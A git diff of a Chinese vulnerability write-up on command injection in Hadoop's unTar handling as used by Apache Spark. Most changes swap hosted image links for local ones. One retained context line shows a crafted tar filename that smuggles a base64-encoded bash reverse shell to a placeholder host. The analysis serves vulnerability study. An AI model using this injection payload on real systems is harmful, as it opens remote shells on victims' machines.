@@ -14,9 +14,9 @@ Apache Spark 3.1.2, 3.2.1, 3.3.0
 
 查看官方的修复补丁
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251624131.png)
+![](./images/202205251624131.png)
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251624468.png)
+![](./images/202205251624468.png)
 
 官方修复针对.tar后缀的压缩包调用了新增的unTarUsingJava函数来进行处理，我们下载存在漏洞的版本看一下漏洞位置
 
@@ -24,7 +24,7 @@ Apache Spark 3.1.2, 3.2.1, 3.3.0
 hadoop-common-2.7.4.jar!/org/apache/hadoop/fs/FileUtil.class
 ```
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251624145.png)
+![](./images/202205251624145.png)
 
 可以看到漏洞主要出现在 Linux对文件的解压处理中
 
@@ -81,4 +81,4 @@ private static void unTarUsingTar(File inFile, File untarDir, boolean gzipped) t
 touch '1\|{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}\|1.tar'
 ```
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251625299.png)
+![](./images/202205251625299.png)
